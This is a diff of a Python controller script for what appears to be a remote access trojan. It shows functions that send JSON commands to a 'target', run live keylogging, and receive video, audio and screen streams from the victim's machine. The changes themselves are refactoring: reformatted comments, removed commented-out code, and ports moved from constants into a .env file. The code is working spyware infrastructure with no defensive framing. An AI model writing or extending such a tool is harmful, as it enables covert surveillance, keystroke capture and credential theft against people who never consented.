@@ -1,8 +1,6 @@
-# Import necessary libraries
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
-import pynput
 import re
 import pyaudio  # This library is used for audio input/output operations.
 from pynput.keyboard import Key, Listener  # This library is used for capturing keyboard events.
@@ -10,14 +8,12 @@ import threading
 import cv2
 import pickle
 import struct
-import time
+from dotenv import load_dotenv
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
-    # Convert the input data into a JSON-encoded string.
-    jsondata = json.dumps(data)
-    # Send the JSON-encoded data over the network connection after encoding it as bytes.
-    target.send(jsondata.encode())
+    jsondata = json.dumps(data)     # Convert the input data into a JSON-encoded string.
+    target.send(jsondata.encode())  # Send the JSON-encoded data over the network connection after encoding it as bytes.
 
 # Function to receive data reliably as JSON-decoded strings
 def reliable_recv():
@@ -103,7 +99,7 @@ def keylogging_live():
     while livekeylogger_ready_to_exit != True:
         pass
 
-# --- Stream Reception Functions ---
+
 def video_reception_thread():
     global video_thread_active, video_connected
     video_thread_active = True
@@ -470,37 +466,17 @@ def target_communication():
                 else:
                     print("[!] Invalid Choice")
 
-
-
-
-
-            # if not video_thread_active and not audio_thread_active:
-            #     reliable_send('stream_start')
-            #     v_thread = threading.Thread(target=video_reception_thread, daemon=True)
-            #     v_thread.start()
-            #     a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
-            #     a_thread.start()
-
-            #     #wait for both video and audio connect then go back to main menu
-            #     while video_connected == False or audio_connected == False:
-            #         pass
-
-            # elif video_thread_active and audio_thread_active:
-            #     video_thread_active = False
-            #     audio_thread_active = False
-
-            #     #wait for both video and audio disconnect then go back to main menu
-            #     while video_connected or audio_connected:
-            #         pass
-
         else:
             print("[!] Invalid main menu option.")
 
-# Port Control Section
-CONTROL_PORT = 5555
-VIDEO_PORT = 9999
-AUDIO_PORT = 9998
-SCREEN_PORT = 9997
+# Load .env file
+load_dotenv()
+
+# Ports Control Section
+CONTROL_PORT = int(os.getenv("CONTROL_PORT"))
+VIDEO_PORT = int(os.getenv("VIDEO_PORT"))
+AUDIO_PORT = int(os.getenv("AUDIO_PORT"))
+SCREEN_PORT = int(os.getenv("SCREEN_PORT"))
 
 # Initialize live capturing screen and audio parameters as False
 video_thread_active, audio_thread_active, screen_thread_active = False, False, False
